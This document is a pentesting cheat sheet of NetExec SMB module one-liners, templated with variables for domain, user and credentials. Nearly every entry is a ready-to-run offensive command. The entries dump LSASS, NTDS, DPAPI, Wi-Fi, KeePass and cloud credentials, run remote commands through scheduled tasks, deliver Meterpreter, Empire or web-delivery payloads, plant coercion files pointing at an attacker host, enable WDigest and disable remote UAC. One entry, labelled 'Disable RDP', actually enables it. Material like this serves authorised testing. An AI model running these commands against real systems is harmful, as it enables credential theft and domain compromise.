# NetExec SMB Modules

## nxc smb modules

### enum_av

Enumerate enum av with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Enumerate Enum Av"
nxc smb $domain -u $user $auth_flags -M enum_av
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_ca

Enumerate enum ca with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Enumerate Enum Ca"
nxc smb $domain -u $user $auth_flags -M enum_ca
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_cve

Enumerate enum CVE with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Enumerate Enum CVE"
nxc smb $domain -u $user $auth_flags -M enum_cve
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### gpp_privileges

Run gpp privileges with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Gpp Privileges"
nxc smb $domain -u $user $auth_flags -M gpp_privileges
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ioxidresolver

Find ioxidresolver with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Find Ioxidresolver"
nxc smb $domain -u $user $auth_flags -M ioxidresolver
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ms17-010

Check ms17 010 with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Ms17 010"
nxc smb $domain -u $user $auth_flags -M ms17-010
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nopac

Check nopac with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Nopac"
nxc smb $domain -u $user $auth_flags -M nopac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlm_reflection

Check NTLM reflection with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check NTLM Reflection"
nxc smb $domain -u $user $auth_flags -M ntlm_reflection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### printnightmare

Check printnightmare with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Printnightmare"
nxc smb $domain -u $user $auth_flags -M printnightmare
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remove-mic

Remove mic with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Remove Mic"
nxc smb $domain -u $user $auth_flags -M remove-mic
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### sccm-recon6

Check sccm recon6 with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Sccm Recon6"
nxc smb $domain -u $user $auth_flags -M sccm-recon6
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### smbghost

Check smbghost with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Smbghost"
nxc smb $domain -u $user $auth_flags -M smbghost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### spooler

Enable spooler with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Enable Spooler"
nxc smb $domain -u $user $auth_flags -M spooler
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### webdav

Check webdav with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Webdav"
nxc smb $domain -u $user $auth_flags -M webdav
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### zerologon

Check zerologon with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Zerologon"
nxc smb $domain -u $user $auth_flags -M zerologon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### aws-credentials

Dump AWS credentials with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump AWS Credentials"
nxc smb $domain -u $user $auth_flags -M aws-credentials
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### change-password

Dump change password with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Change Password"
nxc smb $domain -u $user $auth_flags -M change-password -o USER=$target_user NEWPASS=$target_pass
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var target_pass
-->

### drop-library-ms

Run drop library ms with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Drop Library Ms"
nxc smb $domain -u $user $auth_flags -M drop-library-ms -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### scuffy

Run scuffy with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Scuffy"
nxc smb $domain -u $user $auth_flags -M scuffy -o SERVER=$lhost
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var lhost
-->

### bitlocker (HIGH)

Read bitlocker (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Read Bitlocker (HIGH)"
nxc smb $domain -u $user $auth_flags -M bitlocker
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_dns (HIGH)

Dump enum DNS (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Enum DNS (HIGH)"
nxc smb $domain -u $user $auth_flags -M enum_dns
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### enum_interfaces (HIGH)

Show enum interfaces (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Show Enum Interfaces (HIGH)"
nxc smb $domain -u $user $auth_flags -M enum_interfaces
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hyperv-host (HIGH)

Run hyperv host (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Hyperv Host (HIGH)"
nxc smb $domain -u $user $auth_flags -M hyperv-host
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### install_elevated (HIGH)

Install elevated (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Install Elevated (HIGH)"
nxc smb $domain -u $user $auth_flags -M install_elevated
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_discover (HIGH)

Discover keepass discover (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Discover Keepass Discover (HIGH)"
nxc smb $domain -u $user $auth_flags -M keepass_discover
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lockscreendoors (HIGH)

Set lockscreendoors (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Set Lockscreendoors (HIGH)"
nxc smb $domain -u $user $auth_flags -M lockscreendoors
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntlmv1 (HIGH)

Run ntlmv1 (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Ntlmv1 (HIGH)"
nxc smb $domain -u $user $auth_flags -M ntlmv1
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### presence (HIGH)

Enumerate presence (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Enumerate Presence (HIGH)"
nxc smb $domain -u $user $auth_flags -M presence
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-query (HIGH)

Enumerate reg query (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Enumerate Reg Query (HIGH)"
nxc smb $domain -u $user $auth_flags -M reg-query -o KEY=$reg_key
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var reg_key
-->

### runasppl (HIGH)

Dump runasppl (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Runasppl (HIGH)"
nxc smb $domain -u $user $auth_flags -M runasppl
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### test_connection (HIGH)

Check test connection (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Check Test Connection (HIGH)"
nxc smb $domain -u $user $auth_flags -M test_connection
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### uac (HIGH)

Read uac (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Read Uac (HIGH)"
nxc smb $domain -u $user $auth_flags -M uac
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wcc (HIGH)

Run wcc (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Wcc (HIGH)"
nxc smb $domain -u $user $auth_flags -M wcc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### dpapi_hash (HIGH)

Dump DPAPI hash (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump DPAPI Hash (HIGH)"
nxc smb $domain -u $user $auth_flags -M dpapi_hash
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### eventlog_creds (HIGH)

Download eventlog creds (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Download Eventlog Creds (HIGH)"
nxc smb $domain -u $user $auth_flags -M eventlog_creds
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### handlekatz (HIGH)

Dump handlekatz (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Handlekatz (HIGH)"
nxc smb $domain -u $user $auth_flags -M handlekatz
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### iis (HIGH)

Run iis (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Iis (HIGH)"
nxc smb $domain -u $user $auth_flags -M iis
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### keepass_trigger (HIGH)

Run keepass trigger (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Keepass Trigger (HIGH)"
nxc smb $domain -u $user $auth_flags -M keepass_trigger
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### lsassy (HIGH)

Dump lsassy (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Lsassy (HIGH)"
nxc smb $domain -u $user $auth_flags -M lsassy
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### masky (HIGH)

Dump masky (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Masky (HIGH)"
nxc smb $domain -u $user $auth_flags -M masky
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mobaxterm (HIGH)

Run mobaxterm (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Mobaxterm (HIGH)"
nxc smb $domain -u $user $auth_flags -M mobaxterm
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### mremoteng (HIGH)

Dump mremoteng (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Mremoteng (HIGH)"
nxc smb $domain -u $user $auth_flags -M mremoteng
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### msol (HIGH)

Run msol (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Msol (HIGH)"
nxc smb $domain -u $user $auth_flags -M msol
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### nanodump (HIGH)

Dump nanodump (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Nanodump (HIGH)"
nxc smb $domain -u $user $auth_flags -M nanodump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad (HIGH)

Run notepad (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Notepad (HIGH)"
nxc smb $domain -u $user $auth_flags -M notepad
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### notepad++ (HIGH)

Run notepad++ (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Notepad++ (HIGH)"
nxc smb $domain -u $user $auth_flags -M notepad++
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntds-dump-raw (HIGH)

Dump NTDS dump raw (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump NTDS Dump Raw (HIGH)"
nxc smb $domain -u $user $auth_flags -M ntds-dump-raw
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### ntdsutil (HIGH)

Dump ntdsutil (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Ntdsutil (HIGH)"
nxc smb $domain -u $user $auth_flags -M ntdsutil
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### powershell_history (HIGH)

Read powershell history (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Read Powershell History (HIGH)"
nxc smb $domain -u $user $auth_flags -M powershell_history
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### procdump (HIGH)

Dump procdump (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Procdump (HIGH)"
nxc smb $domain -u $user $auth_flags -M procdump
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### putty (HIGH)

Download putty (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Download Putty (HIGH)"
nxc smb $domain -u $user $auth_flags -M putty
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### rdcman (HIGH)

Dump rdcman (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Rdcman (HIGH)"
nxc smb $domain -u $user $auth_flags -M rdcman
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recent_files (HIGH)

Extract recent files (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Extract Recent Files (HIGH)"
nxc smb $domain -u $user $auth_flags -M recent_files
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### recyclebin (HIGH)

List recyclebin (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules List Recyclebin (HIGH)"
nxc smb $domain -u $user $auth_flags -M recyclebin
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### reg-winlogon (HIGH)

Run reg winlogon (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Reg Winlogon (HIGH)"
nxc smb $domain -u $user $auth_flags -M reg-winlogon
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### security-questions (HIGH)

Run security questions (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Security Questions (HIGH)"
nxc smb $domain -u $user $auth_flags -M security-questions
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### snipped (HIGH)

Download snipped (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Download Snipped (HIGH)"
nxc smb $domain -u $user $auth_flags -M snipped
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### teams_localdb (HIGH)

Run teams localdb (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Teams Localdb (HIGH)"
nxc smb $domain -u $user $auth_flags -M teams_localdb
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### veeam (HIGH)

Run veeam (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Veeam (HIGH)"
nxc smb $domain -u $user $auth_flags -M veeam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### vnc (HIGH)

Dump vnc (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Vnc (HIGH)"
nxc smb $domain -u $user $auth_flags -M vnc
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wam (HIGH)

Dump wam (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Wam (HIGH)"
nxc smb $domain -u $user $auth_flags -M wam
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wdigest (HIGH)

Enable wdigest (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Enable Wdigest (HIGH)"
nxc smb $domain -u $user $auth_flags -M wdigest -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### wifi (HIGH)

Download wifi (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Download Wifi (HIGH)"
nxc smb $domain -u $user $auth_flags -M wifi
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### winscp (HIGH)

Run winscp (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Winscp (HIGH)"
nxc smb $domain -u $user $auth_flags -M winscp
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### empire_exec (HIGH)

Start empire exec (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Start Empire Exec (HIGH)"
nxc smb $domain -u $user $auth_flags -M empire_exec
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### hash_spider (HIGH)

Dump hash spider (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Dump Hash Spider (HIGH)"
nxc smb $domain -u $user $auth_flags -M hash_spider
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### impersonate (HIGH)

List impersonate (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules List Impersonate (HIGH)"
nxc smb $domain -u $user $auth_flags -M impersonate
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### met_inject (HIGH)

Download met inject (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Download Met Inject (HIGH)"
nxc smb $domain -u $user $auth_flags -M met_inject
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### pi (HIGH)

Execute pi (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Execute Pi (HIGH)"
nxc smb $domain -u $user $auth_flags -M pi -o COMMAND=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var cmd
-->

### rdp (HIGH)

Disable RDP (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Disable RDP (HIGH)"
nxc smb $domain -u $user $auth_flags -M rdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### remote-uac (HIGH)

Set remote uac (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Set Remote Uac (HIGH)"
nxc smb $domain -u $user $auth_flags -M remote-uac -o ACTION=disable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### schtask_as (HIGH)

Execute schtask as (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Execute Schtask as (HIGH)"
nxc smb $domain -u $user $auth_flags -M schtask_as -o USER=$target_user CMD=$cmd
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
var target_user
var cmd
-->

### shadowrdp (HIGH)

Run shadowrdp (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Shadowrdp (HIGH)"
nxc smb $domain -u $user $auth_flags -M shadowrdp -o ACTION=enable
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

### web_delivery (HIGH)

Run web delivery (HIGH) with NetExec SMB Modules.

```sh title:"NetExec SMB Modules Run Web Delivery (HIGH)"
nxc smb $domain -u $user $auth_flags -M web_delivery
```
<!-- cheat
import passwords
import domain_ip
import users
import nxc_auth
-->

